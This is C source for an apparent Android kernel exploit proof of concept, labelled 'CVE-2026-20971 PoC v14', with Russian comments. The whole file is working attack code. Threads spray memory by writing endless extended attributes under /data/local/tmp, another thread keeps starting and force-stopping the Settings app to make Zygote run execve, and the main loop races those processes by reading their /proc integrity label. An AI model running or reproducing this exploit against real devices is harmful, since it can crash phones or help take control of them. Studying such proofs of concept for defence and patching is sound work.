#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <errno.h>

// Функция поиска PID по имени
int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[128];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

// Поток для спрея памяти
void* spray_thread(void* arg) {
    char value[56]; 
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);
    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

// Поток-триггер: запускает и убивает приложение, заставляя Zygote делать execve
void* trigger_thread(void* arg) {
    while(1) {
        // Запускаем настройки (Zygote сделает fork + execve)
        system("am start -n com.android.settings/.Settings > /dev/null 2>&1");
        usleep(50000); // 50 мс на загрузку
        // Убиваем, чтобы освободить память и заставить запускаться снова
        system("am force-stop com.android.settings > /dev/null 2>&1");
        usleep(50000);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 PoC v14 (Zygote Execve)\n");

    // 1. Запускаем потоки спрея
    for (int i=0; i<4; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    // 2. Запускаем триггер (am start / am force-stop)
    pthread_t trigger_tid;
    pthread_create(&trigger_tid, NULL, trigger_thread, NULL);
    pthread_detach(trigger_tid);

    char buf[256];
    long iterations = 0;

    while (1) {
        // Ищем процессы, которые сейчас выполняют execve:
        // - zygote64 (родитель)
        // - app_process64 (дочерний процесс до загрузки ART)
        // - com.android.settings (после загрузки)
        int pid = find_pid("zygote64");
        if (pid == -1) pid = find_pid("app_process64");
        if (pid == -1) pid = find_pid("com.android.settings");

        if (pid != -1) {
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d/integrity/label", pid);

            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                read(fd, buf, sizeof(buf)); 
                close(fd);
            }
        }
        
        iterations++;
        if (iterations % 100000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
    }
    return 0;
}